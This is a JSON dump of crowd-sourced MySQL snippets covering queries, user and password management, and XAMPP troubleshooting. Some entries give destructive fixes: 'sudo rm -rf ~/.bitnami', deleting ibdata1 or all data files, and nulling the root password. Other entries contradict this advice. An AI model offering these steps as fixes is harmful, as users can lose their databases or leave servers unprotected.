    "description": "SELECT x.prod_name      , SUM(x.total)   FROM ( SELECT bp.prod_name               , ( SELECT SUM( wh.quantity ) * bp.weight                      FROM bus_warehouse_entries wh                    WHERE bp.prod_code = wh.org_product_code ) AS total        FROM bus_products bp ) x  GROUP BY x.prod_name\n",
    "reg_date": "2021-10-12T09:57:36.000Z"
  },
  {
    "id": 2373,
    "keyword": null,
    "link": null,
    "title": " mysql select into new table",
    "description": "-- Insert into existing my_table INSERT INTO my_table my SELECT * FROM another_table an WHERE an.col1 > 10; -- or directely create the new table CREATE TABLE my_table AS SELECT * FROM another_table an WHERE an.col1 > 10;\nCREATE TABLE artists_and_works   SELECT artist.name, COUNT(work.artist_id) AS number_of_works   FROM artist LEFT JOIN work ON artist.id = work.artist_id   GROUP BY artist.id;\nPress CTRL+C to copy CREATE TABLE new_tbl [AS] SELECT * FROM orig_tbl;\nselect * into <NEW_TABLE_NAME> from <OLD_TABLE>;\n",
    "reg_date": "2021-10-12T09:57:36.000Z"
  },
  {
    "id": 2374,
    "keyword": null,
    "link": null,
    "title": " mysql select last 10 rows",
    "description": "SELECT fields FROM table ORDER BY id DESC LIMIT 1;\nSELECT   (SELECT * FROM tableName ORDER BY col1 LIMIT 1)        AS first,   (SELECT * FROM tableName ORDER BY col1 DESC LIMIT 1)   AS last ;\nSELECT * FROM tableName ORDER BY col1 DESC LIMIT 10;\n",
    "reg_date": "2021-10-12T09:57:36.000Z"
  },
  {
    "id": 2375,
    "keyword": null,
    "link": null,
    "title": " mysql select last 15 minutes",
    "description": "SELECT name FROM users WHERE created_at > (NOW() - INTERVAL 15 MINUTE)\n",
    "reg_date": "2021-10-12T09:57:36.000Z"
  },
  {
    "id": 2376,
    "keyword": null,
    "link": null,
    "title": " mysql select month and year",
    "description": "SELECT DATE_FORMAT(test_date,'%Y%m') AS date FROM test_table;\n",
    "reg_date": "2021-10-12T09:57:37.000Z"
  },
  {
    "id": 2377,
    "keyword": null,
    "link": null,
    "title": " mysql select multiple rows into one column",
    "description": "SELECT \tGROUP_CONCAT(DISTINCT id SEPARATOR ', ') AS 'ids' FROM \ttable_name WHERE \tcolumn_name = 'value'\nmysql count multiple columns in one query:  SELECT          count(*)             as count_rows,         count(col1)          as count_1,         count(col2)          as count_2,         count(distinct col1) as count_distinct_1,         count(distinct col2) as count_distinct_2,         count(distinct col1, col2) as count_distinct_1_2     FROM `table` ;\n-- MySQL  -- t1 = table1 -- dt2 = column of table SELECT t1.dt2, t2.dt4, t2.dt5, t2.dt3 #get dt3 data from table2 FROM table1 t1, table2 t2 -- Doesn't need to have t1, or t2 WHERE t1.dt2 = 'asd' AND t2.dt4 = 'qax' AND t2.dt5 = 456 \n",
    "reg_date": "2021-10-12T09:57:37.000Z"
  },
  {
    "id": 2378,
    "keyword": null,
    "link": null,
    "title": " mysql select random id from table",
    "description": "-- randomly order, select first 5 rows select * from `table_name` order by rand() limit 5\n",
    "reg_date": "2021-10-12T09:57:37.000Z"
  },
  {
    "id": 2379,
    "keyword": null,
    "link": null,
    "title": " mysql select random rows large table",
    "description": "SELECT name   FROM random AS r1 JOIN        (SELECT (RAND() *                      (SELECT MAX(id)                         FROM random)) AS id)         AS r2  WHERE r1.id >= r2.id  ORDER BY r1.id ASC  LIMIT 1;\n",
    "reg_date": "2021-10-12T09:57:37.000Z"
  },
  {
    "id": 2380,
    "keyword": null,
    "link": null,
    "title": " mysql select row max date",
    "description": "SELECT t1.* FROM employees t1 INNER JOIN (     SELECT id, max(job_start) AS job_start FROM employees GROUP BY id ) t2 ON t1.id = t2.id AND t1.job_start = t2.job_start;\n",
    "reg_date": "2021-10-12T09:57:37.000Z"
  },
  {
    "id": 2381,
    "keyword": null,
    "link": null,
    "title": " mysql select row with max value group by",
    "description": "SELECT t1.* FROM employees t1 INNER JOIN (     SELECT id, max(salary) AS salary FROM employees GROUP BY id ) t2 ON t1.id = t2.id AND t1.salary = t2.salary;\n",
    "reg_date": "2021-10-12T09:57:37.000Z"
  },
  {
    "id": 2382,
    "keyword": null,
    "link": null,
    "title": " mysql select smaller of two values",
    "description": "SELECT LEAST(2,0);\n",
    "reg_date": "2021-10-12T09:57:37.000Z"
  },
  {
    "id": 2383,
    "keyword": null,
    "link": null,
    "title": " mysql select statement after index",
    "description": "   SELECT * FROM table1 USE INDEX (col1_index,col2_index)     WHERE col1=1 AND col2=2 AND col3=3;\n",
    "reg_date": "2021-10-12T09:57:37.000Z"
  },
  {
    "id": 2384,
    "keyword": null,
    "link": null,
    "title": " mysql select top",
    "description": "-- SQL Server / MS Access Syntax: SELECT TOP number|percent column_name(s) FROM table_name WHERE condition; -- MySQL Syntax: SELECT column_name(s) FROM table_name WHERE condition LIMIT number; -- Oracle 12 Syntax: SELECT column_name(s) FROM table_name ORDER BY column_name(s)      FETCH FIRST number ROWS ONLY; -- Older Oracle Syntax: SELECT column_name(s) FROM table_name WHERE ROWNUM <= number;\n",
    "reg_date": "2021-10-12T09:57:37.000Z"
  },
  {
    "id": 2385,
    "keyword": null,
    "link": null,
    "title": " mysql select top n rows per group",
    "description": "CREATE TABLE yourtable (   year int,   id varchar(20),   rate decimal(10,2) );  SELECT yourtable.* FROM   yourtable  INNER JOIN (   SELECT   id, GROUP_CONCAT(year ORDER BY rate DESC) grouped_year   FROM     yourtable   GROUP BY id) group_max ON yourtable.id = group_max.id AND FIND_IN_SET(year, grouped_year) <=5 ORDER BY yourtable.id, yourtable.year DESC;\n",
    "reg_date": "2021-10-12T09:57:37.000Z"
  },
  {
    "id": 2386,
    "keyword": null,
    "link": null,
    "title": " mysql select true or false",
    "description": "SELECT IF(count(*) > 0, \"yes\", \"no\") AS output FROM users WHERE name=\"admin\"; # output = \"yes\" or \"no\"  SELECT IF(count(*) > 0, 1, 0) AS output FROM users WHERE name=\"qwerty\"; # output = 1 or 0 \n",
    "reg_date": "2021-10-12T09:57:38.000Z"
  },
  {
    "id": 2387,
    "keyword": null,
    "link": null,
    "title": " mysql select update same table",
    "description": "UPDATE     products_description pd INNER JOIN products_description pd2 ON     (pd.products_id=pd2.products_id AND pd2.language_id=1 AND pd.language_id<>1) SET pd.products_seo = pd2.products_seo;\n",
    "reg_date": "2021-10-12T09:57:38.000Z"
  },
  {
    "id": 2388,
    "keyword": null,
    "link": null,
    "title": " mysql select utc time in eastern time",
    "description": "CONVERT_TZ(created_at,'+00:00','-04:00')\n",
    "reg_date": "2021-10-12T09:57:38.000Z"
  },
  {
    "id": 2389,
    "keyword": null,
    "link": null,
    "title": " mysql select where starts with",
    "description": "SELECT author FROM lyrics WHERE author LIKE 'B%'; \n",
    "reg_date": "2021-10-12T09:57:38.000Z"
  },
  {
    "id": 2390,
    "keyword": null,
    "link": null,
    "title": " mysql separator",
    "description": "GROUP_CONCAT(artists.artistname SEPARATOR '----') \n",
    "reg_date": "2021-10-12T09:57:38.000Z"
  },
  {
    "id": 2391,
    "keyword": null,
    "link": null,
    "title": " mysql server not starting in xampp in mac",
    "description": "sudo rm -rf ~/.bitnami  // type this command in your terminal. //THIS WILL SOLVE THIS PROBLEM BUT WILL DELETE ALL YOUR DATABASES\n",
    "reg_date": "2021-10-12T09:57:38.000Z"
  },
  {
    "id": 2392,
    "keyword": null,
    "link": null,
    "title": " mysql server stored procedure console log",
    "description": "DELIMITER $$  DROP PROCEDURE IF EXISTS `debug_msg`$$ DROP PROCEDURE IF EXISTS `test_procedure`$$  CREATE PROCEDURE debug_msg(enabled INTEGER, msg VARCHAR(255)) BEGIN   IF enabled THEN     select concat('** ', msg) AS '** DEBUG:';   END IF; END $$  CREATE PROCEDURE test_procedure(arg1 INTEGER, arg2 INTEGER) BEGIN   SET @enabled = TRUE;    call debug_msg(@enabled, 'my first debug message');   call debug_msg(@enabled, (select concat_ws('','arg1:', arg1)));   call debug_msg(TRUE, 'This message always shows up');   call debug_msg(FALSE, 'This message will never show up'); END $$  DELIMITER ;\n",
    "reg_date": "2021-10-12T09:57:38.000Z"
  },
  {
    "id": 2393,
    "keyword": null,
    "link": null,
    "title": " mysql server ubuntu",
    "description": "sudo apt update sudo apt install mysql-server sudo mysql_secure_installation\nsudo service mysql-server\nsudo apt install mysql-server sudo mysql_secure_installation utility\nmysql -u root -p \nsudo apt-get update sudo apt-get install mysql-server \n$ mysql $ sudo apt-get install mysql-server $ mysql -u root -p $ sudo mysql -u root -p $ use mysql; $ update user set plugin=&rdquo;mysql_native_password&rdquo; where user=&rsquo;root&rsquo;; $ flush privileges; $ exit $ mysql -u root -p $ create database demo; $ show databases;\n",
    "reg_date": "2021-10-12T09:57:38.000Z"
  },
  {
    "id": 2394,
    "keyword": null,
    "link": null,
    "title": " mysql set field unique",
    "description": "ALTER TABLE mytbl ADD UNIQUE (columnName);\n",
    "reg_date": "2021-10-12T09:57:38.000Z"
  },
  {
    "id": 2395,
    "keyword": null,
    "link": null,
    "title": " mysql set foreign key checks=0",
    "description": "SET FOREIGN_KEY_CHECKS=0; \nSET FOREIGN_KEY_CHECKS=0;\n",
    "reg_date": "2021-10-12T09:57:38.000Z"
  },
  {
    "id": 2396,
    "keyword": null,
    "link": null,
    "title": " mysql set id auto increment",
    "description": "ALTER TABLE users AUTO_INCREMENT=1001;\nSET  @num := 0;  UPDATE your_table SET id = @num := (@num+1);  ALTER TABLE your_table AUTO_INCREMENT =1;\nSELECT AUTO_INCREMENT FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'database_name' AND TABLE_NAME = 'table_name'; \nALTER TABLE User AUTO_INCREMENT = 1;\n",
    "reg_date": "2021-10-12T09:57:38.000Z"
  },
  {
    "id": 2397,
    "keyword": null,
    "link": null,
    "title": " mysql set last insert id",
    "description": "SET @last_id = LAST_INSERT_ID();\n",
    "reg_date": "2021-10-12T09:57:39.000Z"
  },
  {
    "id": 2398,
    "keyword": null,
    "link": null,
    "title": " mysql set max connections",
    "description": "show variables like \"max_connections\"; set global max_connections =5000;\n",
    "reg_date": "2021-10-12T09:57:39.000Z"
  },
  {
    "id": 2399,
    "keyword": null,
    "link": null,
    "title": " mysql set password for user",
    "description": "ALTER USER 'user-name'@'localhost' IDENTIFIED BY 'NEW_USER_PASSWORD';FLUSH PRIVILEGES;\nSET PASSWORD FOR 'user-name'@'localhost' = PASSWORD('NEW_USER_PASSWORD');FLUSH PRIVILEGES;\n-- In case the UPDATE command returns \"Column 'Password' is not updatable\" run ALTER USER 'root'@'localhost' IDENTIFIED BY 'newPassword'; flush privileges;\n# `SET PASSWORD FOR <user> = PASSWORD('<plaintext_password>')` is deprecated SET PASSWORD FOR <user> = '<plaintext_password>'; FLUSH PRIVILEGES;\nUPDATE mysql.user SET authentication_string = PASSWORD('NEW_USER_PASSWORD')WHERE User = 'user-name' AND Host = 'localhost';FLUSH PRIVILEGES;CopyCopyCopied!\n",
    "reg_date": "2021-10-12T09:57:39.000Z"
  },
  {
    "id": 2400,
    "keyword": null,
    "link": null,
    "title": " mysql set primary key",
    "description": "ALTER TABLE tableName MODIFY COLUMN id INT; /* First you should drop auto increment */ ALTER TABLE tableName DROP PRIMARY KEY; /* Dop primary key */ ALTER TABLE tableName ADD PRIMARY KEY (new_id); /* Set primary key to the new column */ ALTER TABLE tableName MODIFY COLUMN new_id INT AUTO_INCREMENT; /* Set auto increment to the new primary key */\nALTER TABLE tbl_quiz_attempt_master   DROP INDEX `PRIMARY`;\n",
    "reg_date": "2021-10-12T09:57:39.000Z"
  },
  {
    "id": 2401,
    "keyword": null,
    "link": null,
    "title": " mysql set root password",
    "description": "#First Login with administrative account (Even root itself)  mysql> use mysql; mysql> SET PASSWORD FOR 'root'@'localhost' = PASSWORD(\"NewPassword\"); mysql> flush privileges;  #Now quit and login mysql> quit  mysql -u root -p #Click enter and It will prompt you to enter password #Just to be safe you should also still try to log in without entering a password\nALTER USER 'root'@'localhost' IDENTIFIED BY 'New-Password';\nuse mysql;  update user set authentication_string=PASSWORD(\"mynewpassword\") where User='root';  flush privileges;  quit \nALTER USER 'root'@'localhost' IDENTIFIED BY 'newPassword'; \n1. If you in skip-grant-tables mode in mysqld_safe:  mysql> UPDATE mysql.user SET authentication_string=null WHERE User='root'; mysql> FLUSH PRIVILEGES; mysql> exit;  and then, in terminal:  $ mysql -u root  in mysql: mysql> ALTER USER 'root'@'localhost' IDENTIFIED WITH caching_sha2_password BY 'yourpasswd';   2. Not in skip-grant-tables mode just in mysql: mysql> ALTER USER 'root'@'localhost' IDENTIFIED WITH caching_sha2_password BY 'yourpasswd';\nALTER USER 'root'@'localhost' IDENTIFIED BY 'NewPassword';\n",
    "reg_date": "2021-10-12T09:57:39.000Z"
  },
  {
    "id": 2402,
    "keyword": null,
    "link": null,
    "title": " mysql set safe mode off",
    "description": "SET SQL_SAFE_UPDATES = 0;\nUPDATE tablename SET columnname=1;\n",
    "reg_date": "2021-10-12T09:57:39.000Z"
  },
  {
    "id": 2403,
    "keyword": null,
    "link": null,
    "title": " mysql set value as null",
    "description": "UPDATE table SET field = NULL WHERE something = something\n",
    "reg_date": "2021-10-12T09:57:39.000Z"
  },
  {
    "id": 2404,
    "keyword": null,
    "link": null,
    "title": " mysql shell insert into",
    "description": "INSERT INTO `members` (`full_names`,`gender`,`physical_address`,`contact_number`) VALUES ('Leonard Hofstadter','Male','Woodcrest',0845738767);  \n",
    "reg_date": "2021-10-12T09:57:39.000Z"
  },
  {
    "id": 2405,
    "keyword": null,
    "link": null,
    "title": " mysql show all tables",
    "description": "show tables; \nSHOW TABLES;\n# First, select your database USE yourDb;  # Then, simply SHOW TABLES;\nCopied mysql> DESCRIBE pet; +---------+-------------+------+-----+---------+-------+ | Field   | Type        | Null | Key | Default | Extra | +---------+-------------+------+-----+---------+-------+ | name    | varchar(20) | YES  |     | NULL    |       | | owner   | varchar(20) | YES  |     | NULL    |       | | species | varchar(20) | YES  |     | NULL    |       | | sex     | char(1)     | YES  |     | NULL    |       | | birth   | date        | YES  |     | NULL    |       | | death   | date        | YES  |     | NULL    |       | +---------+-------------+------+-----+---------+-------+\n -- Select all:  SELECT * FROM Customers;  \nmysqlcheck -c mydatabasename -u root -p\n",
    "reg_date": "2021-10-12T09:57:39.000Z"
  },
  {
    "id": 2406,
    "keyword": null,
    "link": null,
    "title": " mysql show category once count how many products",
    "description": "SELECT category, COUNT(*) as count FROM table GROUP BY category \n",
    "reg_date": "2021-10-12T09:57:39.000Z"
  },
  {
    "id": 2407,
    "keyword": null,
    "link": null,
    "title": " mysql show column data types",
    "description": "SELECT DATA_TYPE from INFORMATION_SCHEMA.COLUMNS where table_schema = &rsquo;yourDatabaseName&rsquo; and table_name = &rsquo;yourTableName&rsquo;.\n",
    "reg_date": "2021-10-12T09:57:40.000Z"
  },
  {
    "id": 2408,
    "keyword": null,
    "link": null,
    "title": " mysql show create table",
    "description": "DESCRIBE table_name; # To show table structure...\nSHOW CREATE TABLE tablename \nDESCRIBE my_table; \nSHOW CREATE TABLE tablename\nCopied mysql> SHOW CREATE TABLE t\\G *************************** 1. row ***************************        Table: t Create Table: CREATE TABLE `t` (   `id` int(11) NOT NULL AUTO_INCREMENT,   `s` char(60) DEFAULT NULL,   PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4\n# First, select your database USE yourDb;  # Then, simply SHOW TABLES;\n",
    "reg_date": "2021-10-12T09:57:40.000Z"
  },
  {
    "id": 2409,
    "keyword": null,
    "link": null,
    "title": " mysql show current connections",
    "description": "show status where `variable_name` = 'Threads_connected';\n",
    "reg_date": "2021-10-12T09:57:40.000Z"
  },
  {
    "id": 2410,
    "keyword": null,
    "link": null,
    "title": " mysql show current queries",
    "description": "show processlist; \nmysql> show processlistG  *************************** 6. row ***************************      Id: 708163    User: root    Host: localhost      db: NULL Command: Query    Time: 0   State: NULL    Info: show processlist *************************** 7. row ***************************      Id: 708174    User: test    Host: localhost      db: test Command: Query    Time: 3   State: Copying to tmp table    Info: select dist.name, dist.filename, count(*) from orders_header h inner join orders_detail d on h.ord 2 rows in set (0.00 sec)\n",
    "reg_date": "2021-10-12T09:57:40.000Z"
  },
  {
    "id": 2411,
    "keyword": null,
    "link": null,
    "title": " mysql show data from table",
    "description": "mysql> SELECT * FROM [table name];\n",
    "reg_date": "2021-10-12T09:57:40.000Z"
  },
  {
    "id": 2412,
    "keyword": null,
    "link": null,
    "title": " mysql show databases",
    "description": "SHOW DATABASES;\nSELECT * FROM SYS.DATABASES\nSELECT DATABASE();\nCopySELECT database(); \n",
    "reg_date": "2021-10-12T09:57:40.000Z"
  },
  {
    "id": 2413,
    "keyword": null,
    "link": null,
    "title": " mysql show foreign keys",
    "description": "SELECT    TABLE_NAME,COLUMN_NAME,CONSTRAINT_NAME, REFERENCED_TABLE_NAME,REFERENCED_COLUMN_NAME FROM   INFORMATION_SCHEMA.KEY_COLUMN_USAGE WHERE   REFERENCED_TABLE_SCHEMA = '<database>' AND   REFERENCED_TABLE_NAME = '<table>';\nSELECT    TABLE_NAME,COLUMN_NAME,CONSTRAINT_NAME, REFERENCED_TABLE_NAME,REFERENCED_COLUMN_NAME FROM   INFORMATION_SCHEMA.KEY_COLUMN_USAGE WHERE   REFERENCED_TABLE_SCHEMA = '<database>' AND   REFERENCED_TABLE_NAME = '<table>' AND   REFERENCED_COLUMN_NAME = '<column>';\n",
    "reg_date": "2021-10-12T09:57:40.000Z"
  },
  {
    "id": 2414,
    "keyword": null,
    "link": null,
    "title": " mysql show grants for database",
    "description": "SELECT * FROM mysql.user;  SELECT * FROM information_schema.user_privileges; SELECT CONCAT('SHOW GRANTS FOR ''',user,'''@''',host,''';') FROM mysql.user; SHOW GRANTS FOR 'my_user'@'localhost';\n",
    "reg_date": "2021-10-12T09:57:40.000Z"
  },
  {
    "id": 2415,
    "keyword": null,
    "link": null,
    "title": " mysql show indexes on table",
    "description": "SHOW INDEX FROM yourtable;\nSHOW INDEXES FROM table_name;\n",
    "reg_date": "2021-10-12T09:57:40.000Z"
  },
  {
    "id": 2416,
    "keyword": null,
    "link": null,
    "title": " mysql show long running queries",
    "description": "show processlist; \n",
    "reg_date": "2021-10-12T09:57:41.000Z"
  },
  {
    "id": 2417,
    "keyword": null,
    "link": null,
    "title": " mysql show queries running",
    "description": "show processlist; \n",
    "reg_date": "2021-10-12T09:57:41.000Z"
  },
  {
    "id": 2418,
    "keyword": null,
    "link": null,
    "title": " mysql show schema",
    "description": "describe [db_name.]table_name;\nshow create table [db_name.]table_name;\n",
    "reg_date": "2021-10-12T09:57:41.000Z"
  },
  {
    "id": 2419,
    "keyword": null,
    "link": null,
    "title": " mysql show table character set",
    "description": "SHOW FULL COLUMNS FROM table_name;\n",
    "reg_date": "2021-10-12T09:57:41.000Z"
  },
  {
    "id": 2420,
    "keyword": null,
    "link": null,
    "title": " mysql show table fields",
    "description": "SHOW COLUMNS FROM mydb.mytable;\nSELECT COLUMN_NAME   FROM INFORMATION_SCHEMA.COLUMNS   WHERE TABLE_SCHEMA = 'my_database' AND TABLE_NAME = 'my_table'; \nDESCRIBE table_name; # To show table structure...\nDESCRIBE my_table; \nCopied mysql> DESCRIBE pet; +---------+-------------+------+-----+---------+-------+ | Field   | Type        | Null | Key | Default | Extra | +---------+-------------+------+-----+---------+-------+ | name    | varchar(20) | YES  |     | NULL    |       | | owner   | varchar(20) | YES  |     | NULL    |       | | species | varchar(20) | YES  |     | NULL    |       | | sex     | char(1)     | YES  |     | NULL    |       | | birth   | date        | YES  |     | NULL    |       | | death   | date        | YES  |     | NULL    |       | +---------+-------------+------+-----+---------+-------+\n",
    "reg_date": "2021-10-12T09:57:41.000Z"
  },
  {
    "id": 2421,
    "keyword": null,
    "link": null,
    "title": " mysql show table info",
    "description": "# First, select your database USE yourDb;  # Then, simply SHOW TABLES;\nCopied mysql> DESCRIBE pet; +---------+-------------+------+-----+---------+-------+ | Field   | Type        | Null | Key | Default | Extra | +---------+-------------+------+-----+---------+-------+ | name    | varchar(20) | YES  |     | NULL    |       | | owner   | varchar(20) | YES  |     | NULL    |       | | species | varchar(20) | YES  |     | NULL    |       | | sex     | char(1)     | YES  |     | NULL    |       | | birth   | date        | YES  |     | NULL    |       | | death   | date        | YES  |     | NULL    |       | +---------+-------------+------+-----+---------+-------+\n -- Select all:  SELECT * FROM Customers;  \n",
    "reg_date": "2021-10-12T09:57:41.000Z"
  },
  {
    "id": 2422,
    "keyword": null,
    "link": null,
    "title": " mysql show table partitions",
    "description": "Copied mysql> SHOW CREATE TABLE trb3\\G *************************** 1. row ***************************        Table: trb3 Create Table: CREATE TABLE `trb3` (   `id` int(11) default NULL,   `name` varchar(50) default NULL,   `purchased` date default NULL ) ENGINE=MyISAM DEFAULT CHARSET=latin1 PARTITION BY RANGE (YEAR(purchased)) (   PARTITION p0 VALUES LESS THAN (1990) ENGINE = MyISAM,   PARTITION p1 VALUES LESS THAN (1995) ENGINE = MyISAM,   PARTITION p2 VALUES LESS THAN (2000) ENGINE = MyISAM,   PARTITION p3 VALUES LESS THAN (2005) ENGINE = MyISAM ) 1 row in set (0.00 sec)\n",
    "reg_date": "2021-10-12T09:57:41.000Z"
  },
  {
    "id": 2423,
    "keyword": null,
    "link": null,
    "title": " mysql show table structure",
    "description": "show tables; \nDESCRIBE table_name; # To show table structure...\nSHOW TABLES;\nDESCRIBE my_table; \nCopied mysql> SHOW CREATE TABLE t\\G *************************** 1. row ***************************        Table: t Create Table: CREATE TABLE `t` (   `id` int(11) NOT NULL AUTO_INCREMENT,   `s` char(60) DEFAULT NULL,   PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4\n# First, select your database USE yourDb;  # Then, simply SHOW TABLES;\n",
    "reg_date": "2021-10-12T09:57:41.000Z"
  },
  {
    "id": 2424,
    "keyword": null,
    "link": null,
    "title": " mysql show tables in database",
    "description": "show tables; \nDESCRIBE table_name; # To show table structure...\nSHOW TABLES;\n# First, select your database USE yourDb;  # Then, simply SHOW TABLES;\nCopied mysql> DESCRIBE pet; +---------+-------------+------+-----+---------+-------+ | Field   | Type        | Null | Key | Default | Extra | +---------+-------------+------+-----+---------+-------+ | name    | varchar(20) | YES  |     | NULL    |       | | owner   | varchar(20) | YES  |     | NULL    |       | | species | varchar(20) | YES  |     | NULL    |       | | sex     | char(1)     | YES  |     | NULL    |       | | birth   | date        | YES  |     | NULL    |       | | death   | date        | YES  |     | NULL    |       | +---------+-------------+------+-----+---------+-------+\n -- Select all:  SELECT * FROM Customers;  \n",
    "reg_date": "2021-10-12T09:57:41.000Z"
  },
  {
    "id": 2425,
    "keyword": null,
    "link": null,
    "title": " mysql show users",
    "description": "select * from mysql.user; #or for less data select user, host from mysql.user;\n//To show all data use following query select * from mysql.user; // To show user and host use following query select User,Host from mysql.user;\nSELECT User FROM mysql.user;\nmysql> select host, user, password from mysql.user; \nSELECT User, Host, Password, password_expired FROM mysql.user;\nSELECT * FROM mysql.user; ## OR SELECT user, host FROM mysql.user;\n",
    "reg_date": "2021-10-12T09:57:41.000Z"
  },
  {
    "id": 2426,
    "keyword": null,
    "link": null,
    "title": " mysql show variables",
    "description": "SHOW VARIABLES;\t\t\t\t\t\t\t\t-- complete list SHOW VARIABLES LIKE 'secure_file_priv';\t\t-- search SHOW VARIABLES LIKE 'secure_%';\nPress CTRL+C to copy SHOW [GLOBAL | SESSION] VARIABLES     [LIKE 'pattern' | WHERE expr]\n",
    "reg_date": "2021-10-12T09:57:41.000Z"
  },
  {
    "id": 2427,
    "keyword": null,
    "link": null,
    "title": " mysql show variables like secure file priv",
    "description": "SHOW VARIABLES;\t\t\t\t\t\t\t\t-- complete list SHOW VARIABLES LIKE 'secure_file_priv';\t\t-- search SHOW VARIABLES LIKE 'secure_%';\nSHOW VARIABLES LIKE \"secure_file_priv\";\n",
    "reg_date": "2021-10-12T09:57:42.000Z"
  },
  {
    "id": 2428,
    "keyword": null,
    "link": null,
    "title": " mysql show views",
    "description": "                                     SHOW FULL TABLES  WHERE table_type = 'VIEW'; \n                                     SELECT *  FROM information_schema.tables; \nviews in mysql\n",
    "reg_date": "2021-10-12T09:57:42.000Z"
  },
  {
    "id": 2429,
    "keyword": null,
    "link": null,
    "title": " mysql shutdown",
    "description": "STOP! Please do NOT delete ibdata1 file!  Deleting this file is like playing a Russian roulette with your databases, it could work and restablish everything, but also, probably could leave unusable every database you have.  Instead, first try using the MySQL backup folder which is included with XAMPP. So do the next:  Rename the folder mysql/data to mysql/data_old (you can use any name) Create a new folder mysql/data Copy the content that resides in mysql/backup to the new mysql/data folder Copy all your database folders that are in mysql/data_old to mysql/data (skipping the mysql, performance_schema, and phpmyadmin folders from data_old) Finally copy the ibdata1 file from mysql/data_old and replace it inside mysql/data folder Start MySQL from XAMPP control panel And, voil&agrave;!\n",
    "reg_date": "2021-10-12T09:57:42.000Z"
  },
  {
    "id": 2430,
    "keyword": null,
    "link": null,
    "title": " mysql shutdown unexpectedly",
    "description": "So, before deleting files, first try to do what the error message in XAMPP  message panel recommend you to do, using the MySQL backup folder which is  included with XAMPP. So do the next:  Rename the folder mysql/data to mysql/data_old (you can use any name)  Create a new folder mysql/data  Copy the content that resides in mysql/backup to the new mysql/data folder  Copy all your database folders that are in mysql/data_old to mysql/data  (skipping the mysql, performance_schema, and phpmyadmin folders from data_old)  Finally copy the ibdata1 file from mysql/data_old and replace it inside  mysql/data folder  Start MySQL from XAMPP control panel  And, voil&agrave;. No databases lost, no ports changed, no run as administrator,  no force recovery, no kill mysqld process, no restoring from previous versions, no more errors.\n1. Exit Xampp and navigate to xampp/mysql/data directory 2. delete the ibdata1 file 3. restart the XAMPP server  or  1. Exit Xampp and navigate to xampp/mysql/data directory 2. delete the ibdata1, ib_logfile0,ib_logfile1,ib_logfile101 files 3. restart the XAMPP server  or  Try to check the error log at the installed location: /xampp/mysql/data/mysql_error.log This can help you better debug the problem. Also Note:  1. XAMPP might hit into port issue when you have skype also running. 2. There is a federated plugin issue that is common.\nInstead, first try using the MySQL backup folder which is included with XAMPP. So do the next:  1.Rename the folder mysql/data to mysql/data_old (you can use any name) 2.Create a new folder mysql/data 3.Copy the content that resides in mysql/backup to the new mysql/data folder 4.Copy all your database folders that are in mysql/data_old to mysql/data (skipping the mysql, performance_schema, and phpmyadmin folders from data_old) 5.Finally copy the ibdata1 file from mysql/data_old and replace it inside mysql/data folder 6.Start MySQL from XAMPP control panel And, voil&agrave;!\n1. Exit Xampp and navigate to xampp/mysql/data directory 2. delete the ibdata1 file 3. restart the XAMPP server  or  1. Exit Xampp and navigate to xampp/mysql/data directory 2. delete the ibdata1, ib_logfile0,ib_logfile1,ib_logfile101 files 3. restart the XAMPP server  or  Try to check the error log at the installed location: /xampp/mysql/data/mysql_error.log\nStop there! Please do not delete anything!  Some of the answers in Stackoverflow or in other platform could leave completely unusable your database!, so, before deleting files, first try to do what the error message in XAMPP message panel recommend you to do, using the MySQL backup folder which is included with XAMPP. So do the next:  Step 1. Rename the folder c:\\xampp\\mysql\\data to c:\\xampp\\mysql\\data_old (you can use any name).  Step 2. Create a new folder c:\\xampp\\mysql/data.  Step 3. Copy the content that resides in mysql\\backup to the new mysql\\data folder.  Step 4. Copy all your database folders that are in mysql\\data_old to mysql\\data (skipping the mysql, performance_schema, and phpmyadmin folders from data_old).  Step 5. Finally copy the ibdata1 file from mysql\\data_old and replace it inside mysql\\data folder.  Step 6. Start MySQL from XAMPP control panel.  And, Its DONE . No databases lost, no ports changed, no run as administrator, no force recovery, no kill mysqld process, no restoring from previous versions, no more errors.\ngo to Xampp and navigate to xampp/mysql/data directory delete all files and dir and paste files in backup directory\n",
    "reg_date": "2021-10-12T09:57:42.000Z"
  },
  {
    "id": 2431,
    "keyword": null,
    "link": null,
    "title": " mysql shutdown unexpectedly xampp",
    "description": "STOP! Please do NOT delete ibdata1 file!  Deleting this file is like playing a Russian roulette with your databases, it could work and restablish everything, but also, probably could leave unusable every database you have.  Instead, first try using the MySQL backup folder which is included with XAMPP. So do the next:  Rename the folder mysql/data to mysql/data_old (you can use any name) Create a new folder mysql/data Copy the content that resides in mysql/backup to the new mysql/data folder Copy all your database folders that are in mysql/data_old to mysql/data (skipping the mysql, performance_schema, and phpmyadmin folders from data_old) Finally copy the ibdata1 file from mysql/data_old and replace it inside mysql/data folder Start MySQL from XAMPP control panel And, voil&agrave;!\nSo, before deleting files, first try to do what the error message in XAMPP  message panel recommend you to do, using the MySQL backup folder which is  included with XAMPP. So do the next:  Rename the folder mysql/data to mysql/data_old (you can use any name)  Create a new folder mysql/data  Copy the content that resides in mysql/backup to the new mysql/data folder  Copy all your database folders that are in mysql/data_old to mysql/data  (skipping the mysql, performance_schema, and phpmyadmin folders from data_old)  Finally copy the ibdata1 file from mysql/data_old and replace it inside  mysql/data folder  Start MySQL from XAMPP control panel  And, voil&agrave;. No databases lost, no ports changed, no run as administrator,  no force recovery, no kill mysqld process, no restoring from previous versions, no more errors.\n1. Exit Xampp and navigate to xampp/mysql/data directory 2. delete the ibdata1 file 3. restart the XAMPP server  or  1. Exit Xampp and navigate to xampp/mysql/data directory 2. delete the ibdata1, ib_logfile0,ib_logfile1,ib_logfile101 files 3. restart the XAMPP server  or  Try to check the error log at the installed location: /xampp/mysql/data/mysql_error.log This can help you better debug the problem. Also Note:  1. XAMPP might hit into port issue when you have skype also running. 2. There is a federated plugin issue that is common.\n1. Exit Xampp and navigate to xampp/mysql/data directory 2. delete the ibdata1 file 3. restart the XAMPP server  or  1. Exit Xampp and navigate to xampp/mysql/data directory 2. delete the ibdata1, ib_logfile0,ib_logfile1,ib_logfile101 files 3. restart the XAMPP server  or  Try to check the error log at the installed location: /xampp/mysql/data/mysql_error.log\ngo to Xampp and navigate to xampp/mysql/data directory delete all files and dir and paste files in backup directory\n",
